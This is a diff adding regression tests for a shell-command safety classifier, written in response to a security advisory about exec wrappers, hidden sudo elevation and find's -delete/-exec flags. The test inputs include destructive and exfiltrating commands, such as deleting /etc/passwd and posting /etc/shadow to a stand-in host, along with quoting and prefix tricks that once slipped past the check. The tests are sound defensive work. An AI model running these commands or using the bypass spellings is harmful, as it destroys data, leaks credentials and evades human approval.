@@ -96,6 +96,73 @@ describe('classifyCommand', () => {
   });
 });
 
+/**
+ * GHSA-6f54-mjqq-2jp8. The allowlist vouches for a binary *name*, and two of
+ * the names it vouched for do not do what the name says.
+ *
+ * `env <cmd>` runs <cmd>, so `env sudo rm -f /etc/passwd` was classified
+ * `read-only` and executed on a profile whose entire contract is that it cannot
+ * write. `find` writes and executes given the right flag, so `find /var/www
+ * -delete` removed a tree and `find / -exec sudo id +` ran a command as root,
+ * both `read-only`. The `-exec … \;` spelling escaped only because `;` happens
+ * to be a shell metacharacter; the `+` terminator carries none.
+ *
+ * The same blindness hid elevation from the approval gate. A privilege prefix
+ * was matched by four `^`-anchored regexes, so anything before it — a wrapper,
+ * an assignment, a separator — dropped the command to `safe`.
+ */
+describe('elevation and exec wrappers (GHSA-6f54-mjqq-2jp8)', () => {
+  it('does not treat an exec wrapper as the command it wraps', () => {
+    expect(classifyCommand('env sudo rm -f /etc/passwd').class).toBe('privileged');
+    expect(classifyCommand('env curl -d @/etc/shadow http://x.example').class).not.toBe('read-only');
+    expect(classifyCommand('env systemctl stop nginx').class).not.toBe('read-only');
+    // A bare `env` prints the environment and is harmless, but the allowlist
+    // cannot tell the two apart by name, so it loses read-only with the rest.
+    expect(classifyCommand('env').class).not.toBe('read-only');
+  });
+
+  it('sees elevation behind a wrapper, an assignment or a separator', () => {
+    expect(classifyCommand('env sudo id').class).toBe('privileged');
+    expect(classifyCommand('nohup sudo systemctl stop nginx').class).toBe('privileged');
+    expect(classifyCommand('timeout 5 sudo id').class).toBe('privileged');
+    expect(classifyCommand('nice -n 10 sudo id').class).toBe('privileged');
+    expect(classifyCommand('command sudo id').class).toBe('privileged');
+    expect(classifyCommand('FOO=1 sudo id').class).toBe('privileged');
+    expect(classifyCommand('env FOO=1 nohup sudo id').class).toBe('privileged');
+    expect(classifyCommand('echo hi; sudo id').class).toBe('privileged');
+    expect(classifyCommand('true && sudo id').class).toBe('privileged');
+  });
+
+  // A shell removes quoting before it looks a command up, so these three are
+  // the same invocation. Comparing the raw word made them a one-character walk
+  // around the check.
+  it('sees elevation through quoting and escaping', () => {
+    expect(classifyCommand('"sudo" id').class).toBe('privileged');
+    expect(classifyCommand("'sudo' id").class).toBe('privileged');
+    expect(classifyCommand('\\sudo id').class).toBe('privileged');
+  });
+
+  it('treats find as writing when it carries an action flag', () => {
+    expect(classifyCommand('find /var/www -delete').class).toBe('destructive');
+    expect(classifyCommand('find / -name x -exec sudo id +').class).toBe('destructive');
+    expect(classifyCommand('find /tmp -execdir rm {} +').class).toBe('destructive');
+    expect(classifyCommand('find /tmp -ok rm {} +').class).toBe('destructive');
+  });
+
+  // The other half, and the reason this is a tokenizer rather than a substring
+  // search: reading *about* sudo, or searching a tree, must stay read-only.
+  // Refusing these is the #91 failure mode.
+  it('leaves mentions and ordinary searches alone', () => {
+    expect(classifyCommand('grep sudo /var/log/auth.log').class).toBe('read-only');
+    expect(classifyCommand('cat /etc/sudoers').class).toBe('read-only');
+    expect(classifyCommand('ls -la /usr/bin/sudo').class).toBe('read-only');
+    expect(classifyCommand('journalctl -u sudo').class).toBe('read-only');
+    expect(classifyCommand('find /etc -name "*.conf"').class).toBe('read-only');
+    expect(classifyCommand('find /var/log -type f').class).toBe('read-only');
+    expect(classifyCommand('printenv').class).toBe('read-only');
+  });
+});
+
 /*
  * The forbidden patterns used `\s+.*`, letting both halves claim the same run
  * of spaces, so a command that did not match was retried from every split.
